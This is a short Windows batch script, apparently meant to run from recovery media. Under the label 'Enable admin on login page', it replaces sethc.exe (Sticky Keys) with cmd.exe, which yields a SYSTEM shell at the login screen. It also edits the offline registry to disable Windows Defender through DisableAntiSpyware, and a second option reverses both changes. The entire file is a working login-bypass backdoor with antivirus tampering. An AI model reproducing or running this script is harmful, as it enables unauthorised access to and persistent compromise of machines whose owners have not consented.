@ echo off

FOR %%w IN (C D E F G H I J K L N M O P Q R S T U V W X Y Z) DO IF EXIST %%w:\PerfLogs set SYSPART=%%w:
echo "%SYSPART%"

:MENU
ECHO.
ECHO 1 - Enable admin on login page
ECHO 2 - Disabling admin on login page
ECHO.
SET /P M=Type 1 or 2 then press ENTER:
IF %M%==1 GOTO ENABLE
IF %M%==2 GOTO DISABLE

:ENABLE
copy %SYSPART%\windows\system32\sethc.exe %SYSPART%\
copy /y %SYSPART%\windows\system32\cmd.exe %SYSPART%\windows\system32\sethc.exe
reg load HKLM\temp-hive %SYSPART%\windows\system32\config\SOFTWARE
reg add "HKLM\temp-hive\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg unload HKLM\temp-hive
pause
echo "Completed"
exit

:DISABLE
copy /y %SYSPART%\sethc.exe %SYSPART%\windows\system32\sethc.exe
reg load HKLM\temp-hive %SYSPART%\windows\system32\config\SOFTWARE
reg add "HKLM\temp-hive\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 0 /f
reg unload HKLM\temp-hive
pause
echo "Completed"
exit

